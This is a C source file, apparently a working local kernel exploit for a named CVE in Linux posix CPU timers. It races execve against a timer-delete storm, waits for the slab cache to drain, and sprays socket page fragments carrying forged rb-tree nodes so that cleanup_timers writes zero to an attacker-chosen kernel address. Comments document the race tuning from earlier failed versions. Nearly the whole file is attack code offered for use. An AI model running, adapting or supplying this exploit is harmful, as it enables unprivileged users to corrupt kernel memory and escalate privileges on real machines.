/*
 * l60.c - CVE-2026-64560 unprivileged controlled 8-byte zero write (lhasa).
 *
 * Race structure: the PARENT owns and deletes the timers (so the delete storm
 * survives the victim's execve and every timer really gets freed -> empty slabs
 * can go back to the buddy allocator), while the victim's NON-LEADER thread
 * calls execve() *in the middle of* the storm so de_thread() overlaps
 * posix_cpu_timer_del().
 *
 * Why not t64560_v33: it releases exec only after 40 of 400 deletes, but 400
 * timer_delete calls finish in microseconds and execve's de_thread() lands
 * after the storm is already over -> 300 rounds / 4800 execs, zero hits,
 * posix_timers_cache active never moved.
 *
 * Why not cve64560_probe3: execve kills every other thread of the victim, so
 * the deleters die and the remaining timers stay allocated until process exit;
 * empty slabs never reach the buddy allocator (attempt 1 showed slab 1721/2100,
 * the drain gate could never pass).
 *
 * Trigger: victim exit -> posix_cpu_timers_exit -> cleanup_timers
 *          -> timerqueue_del -> rb_erase walks the dangling node.
 *
 * Forged node (takes the "only left child" branch of __rb_erase_augmented,
 * which only writes, never reads the target):
 *     __rb_parent_color = 0   rb_right = 0   rb_left = TARGET
 *   => *(TARGET) = 0, and rb_next() returns NULL so rb_leftmost is not
 *      poisoned and cleanup_timers does not iterate a second time.
 *
 * usage:
 *   l60 <attempts> <timers/victim> <victims> <nfrag> <drain_max_ms> <target> [child_sleep_ms]
 */
#define _GNU_SOURCE
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_timer_create
#define SYS_timer_create 107
#endif
#ifndef SYS_timer_settime
#define SYS_timer_settime 110
#endif
#ifndef SYS_timer_delete
#define SYS_timer_delete 111
#endif

#define CPUCLOCK_SCHED 2
#define MAX_TIMERS     2048
#define MAXVICTIM      32
#define MAXFRAG        16000

#define ITIMER_NODE_OFF 0x0e0UL     /* struct k_itimer.it.cpu.node */
#define SLOT_STRIDE     0x180UL     /* sizeof(struct k_itimer) = 384 bytes */
#define PAGE_FRAG_SZ    8192UL
#define FILL_BYTE       0x41
#define NWORKER         4

static unsigned long long g_target;
static int g_child_sleep_ms = 2000;

static volatile int *g_go;          /* release the victim's execve */
static volatile int *g_delgo;       /* release the delete storm */
static volatile int *g_delcnt;      /* successful deletes so far */

struct execarg { int idx; };
struct deljob  { int widx, wcnt, n, victim; int *ids; };

/* non-leader thread: exec once released, which runs de_thread() */
static void *victim_exec_thread(void *arg)
{
    struct execarg *ea = arg;
    while (!g_go[ea->idx])
        sched_yield();
    char *const av[] = { (char *)"/proc/self/exe", (char *)"--child", NULL };
    char *const ep[] = { NULL };
    execve(av[0], av, ep);
    _exit(7);
}

static void *delete_storm(void *arg)
{
    struct deljob *j = arg;
    while (!g_delgo[j->victim])
        sched_yield();
    for (int i = j->widx; i < j->n; i += j->wcnt)
        if (syscall(SYS_timer_delete, j->ids[i]) == 0)
            __sync_fetch_and_add((int *)&g_delcnt[j->victim], 1);
    return NULL;
}

static int read_posix_slab(int *active, int *total)
{
    FILE *f = fopen("/proc/slabinfo", "re");
    char line[256];
    if (!f)
        return -1;
    while (fgets(line, sizeof line, f)) {
        if (sscanf(line, "posix_timers_cache %d %d", active, total) == 2) {
            fclose(f);
            return 0;
        }
    }
    fclose(f);
    return -1;
}

static void build_fragment(unsigned char *p, size_t len, unsigned long long left)
{
    memset(p, FILL_BYTE, len);
    for (unsigned long slot = 0; slot + SLOT_STRIDE <= len; slot += SLOT_STRIDE) {
        unsigned long base = slot + ITIMER_NODE_OFF;
        if (base + 0x30 > len)
            break;
        *(unsigned long long *)(p + base + 0x00) = 0;      /* __rb_parent_color */
        *(unsigned long long *)(p + base + 0x08) = 0;      /* rb_right  */
        *(unsigned long long *)(p + base + 0x10) = left;   /* rb_left   */
        *(unsigned long long *)(p + base + 0x18) = 0;      /* expires   */
        *(unsigned long long *)(p + base + 0x20) = 0;      /* cpu_timer.task */
        *(unsigned long long *)(p + base + 0x28) = 0;      /* cpu_timer.pid  */
    }
}

static int g_ring[MAXFRAG];
static int g_ring_n, g_ring_cap;

static int frag_spray(int n, const unsigned char *buf)
{
    int ok = 0;
    for (int i = 0; i < n; i++) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sv) != 0)
            break;
        if (send(sv[0], buf, PAGE_FRAG_SZ, MSG_NOSIGNAL) != (ssize_t)PAGE_FRAG_SZ) {
            close(sv[0]);
            close(sv[1]);
            break;
        }
        close(sv[0]);
        if (g_ring_n < g_ring_cap)
            g_ring[g_ring_n++] = sv[1];
        else
            close(sv[1]);
        ok++;
    }
    return ok;
}

static void frag_trim_all(void)
{
    for (int i = 0; i < g_ring_n; i++)
        close(g_ring[i]);
    g_ring_n = 0;
}

static long long now_ms(void)
{
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return (long long)t.tv_sec * 1000 + t.tv_nsec / 1000000;
}

int main(int argc, char **argv)
{
    if (argc > 1 && !strcmp(argv[1], "--child")) {
        signal(SIGUSR1, SIG_IGN);
        usleep(g_child_sleep_ms * 1000);
        _exit(0);        /* do_exit -> posix_cpu_timers_exit -> cleanup_timers */
    }

    int attempts = argc > 1 ? atoi(argv[1]) : 400;
    int ntimer   = argc > 2 ? atoi(argv[2]) : 1000;
    int nv       = argc > 3 ? atoi(argv[3]) : 8;
    int nfrag    = argc > 4 ? atoi(argv[4]) : 8000;
    int drain_ms = argc > 5 ? atoi(argv[5]) : 8000;
    if (argc > 6) g_target = strtoull(argv[6], NULL, 0);
    if (argc > 7) g_child_sleep_ms = atoi(argv[7]);

    if (ntimer > MAX_TIMERS) ntimer = MAX_TIMERS;
    if (nv > MAXVICTIM) nv = MAXVICTIM;
    if (nfrag > MAXFRAG) nfrag = MAXFRAG;
    g_ring_cap = nfrag + 512;

    signal(SIGUSR1, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur < rl.rlim_max) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
    }

    char *shm = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                     MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (shm == MAP_FAILED)
        return 1;
    g_go     = (volatile int *)(shm + 0);
    g_delgo  = (volatile int *)(shm + 256);
    g_delcnt = (volatile int *)(shm + 512);

    unsigned char *fbuf = malloc(PAGE_FRAG_SZ);
    if (!fbuf)
        return 1;
    build_fragment(fbuf, PAGE_FRAG_SZ, g_target);

    int base_a = -1, base_t = -1;
    read_posix_slab(&base_a, &base_t);
    printf("l60v3 target=%#llx attempts=%d timers=%d victims=%d frag=%d "
           "drain=%dms baseline=%d/%d\n",
           g_target, attempts, ntimer, nv, nfrag, drain_ms, base_a, base_t);
    fflush(stdout);

    /* Release execve almost at storm start (probe3 timing hits reliably on
     * lhasa: +84 persistent leak per 40 rounds). Later release points leave
     * too few deletes in flight to race with de_thread(). */
    static const int FRAC_TBL[5] = { 0, 2, 5, 10, 20 };

    for (int a = 1; a <= attempts; a++) {
        pid_t vpid[MAXVICTIM];
        int *ids[MAXVICTIM];
        int del_ok = 0;
        int release_frac = FRAC_TBL[(a - 1) % 5];

        for (int j = 0; j < MAXVICTIM; j++) { vpid[j] = -1; ids[j] = NULL; }
        for (int j = 0; j < nv; j++) { g_go[j] = 0; g_delgo[j] = 0; g_delcnt[j] = 0; }

        for (int j = 0; j < nv; j++) {
            pid_t v = fork();
            if (v == 0) {
                /* Only a NON-LEADER thread's execve runs de_thread() ->
                 * release_task(old_leader) -> sighand = NULL, which is the
                 * entry point of this bug. A leader's own exec does not. */
                signal(SIGUSR1, SIG_IGN);
                struct execarg ea;
                ea.idx = j;
                pthread_t eth;
                if (pthread_create(&eth, NULL, victim_exec_thread, &ea) != 0)
                    _exit(8);
                for (;;)
                    pause();
            }
            if (v < 0)
                break;
            vpid[j] = v;

            clockid_t cid = (clockid_t)(((~(unsigned int)v) << 3) | CPUCLOCK_SCHED);
            ids[j] = calloc((size_t)ntimer, sizeof(int));
            int n = 0;
            for (; n < ntimer; n++) {
                struct sigevent ev;
                struct itimerspec its;
                int id = -1;
                memset(&ev, 0, sizeof ev);
                ev.sigev_notify = SIGEV_SIGNAL;
                ev.sigev_signo = SIGUSR1;
                if (syscall(SYS_timer_create, cid, &ev, &id) != 0)
                    break;
                memset(&its, 0, sizeof its);
                its.it_value.tv_sec = 3600;
                if (syscall(SYS_timer_settime, id, 0, &its, NULL) != 0)
                    break;
                ids[j][n] = id;
            }
            if (n < 2) {
                free(ids[j]);
                ids[j] = NULL;
                continue;
            }

            pthread_t th[NWORKER];
            struct deljob job[NWORKER];
            for (int i = 0; i < NWORKER; i++) {
                job[i].widx = i;
                job[i].wcnt = NWORKER;
                job[i].n = n;
                job[i].victim = j;
                job[i].ids = ids[j];
                pthread_create(&th[i], NULL, delete_storm, &job[i]);
            }

            /* Key ordering: let the storm run first, then release execve once
             * release_frac% of the timers are gone, so de_thread() lands among
             * the remaining deletes. Releasing exec first makes every
             * timer_delete hit the sighand==NULL path and fail, so
             * posix_timers_cache only grows and never drains (measured). */
            g_delgo[j] = 1;
            int target = (n * release_frac) / 100;
            if (target > n - 1)
                target = n - 1;
            for (long spin = 0; spin < 50000000L; spin++) {
                if (g_delcnt[j] >= target)
                    break;
                sched_yield();
            }
            g_go[j] = 1;
            for (int i = 0; i < NWORKER; i++)
                pthread_join(th[i], NULL);
            del_ok += g_delcnt[j];
        }

        /* Empty slabs only reach the buddy allocator ~2-3 s after the storm
         * (measured: 714 -> 1030 at t+1s -> 489/693 at t+3s). Spraying before
         * that means the dangling page is still owned by the slab cache and no
         * frag can ever take it. So wait for total to actually bottom out. */
        long long t0 = now_ms();
        int drained = 0, act = -1, tot = -1;
        while (now_ms() - t0 < drain_ms) {
            long long el = now_ms() - t0;
            if (read_posix_slab(&act, &tot) == 0) {
                /* relaxed: the exact minimum is not predictable; we only need
                 * "the surge is over", and a minimum wait because empty slabs
                 * need ~3 s to reach the buddy allocator (measured). */
                if (el >= 2500 && tot <= base_t + 100) {
                    drained = 1;
                    break;
                }
            }
            usleep(100000);
        }
        long long drain_used = now_ms() - t0;
        int got = frag_spray(nfrag, fbuf);

        for (int j = 0; j < nv; j++)
            if (vpid[j] > 0)
                kill(vpid[j], SIGKILL);
        usleep(250000);

        int leaks = 0;
        for (int i = 0; i < g_ring_n && leaks < 4; i++) {
            unsigned char back[PAGE_FRAG_SZ];
            ssize_t n = recv(g_ring[i], back, sizeof back, MSG_DONTWAIT);
            if (n != (ssize_t)sizeof back)
                continue;
            for (size_t off = 0; off + 8 <= sizeof back; off += 8) {
                if (memcmp(back + off, fbuf + off, 8) == 0)
                    continue;
                unsigned long long v;
                memcpy(&v, back + off, 8);
                printf("LEAK attempt=%d off=%#zx val=%#llx\n", a, off, v);
                leaks++;
                if (leaks >= 4)
                    break;
            }
        }

        frag_trim_all();
        for (int j = 0; j < nv; j++)
            free(ids[j]);

        printf("attempt=%d frac=%d%% del_ok=%d drained=%d(%lldms) slab=%d/%d "
               "frag=%d leaks=%d\n",
               a, release_frac, del_ok, drained, drain_used, act, tot, got, leaks);
        fflush(stdout);
    }
    printf("DONE attempts=%d\n", attempts);
    return 0;
}
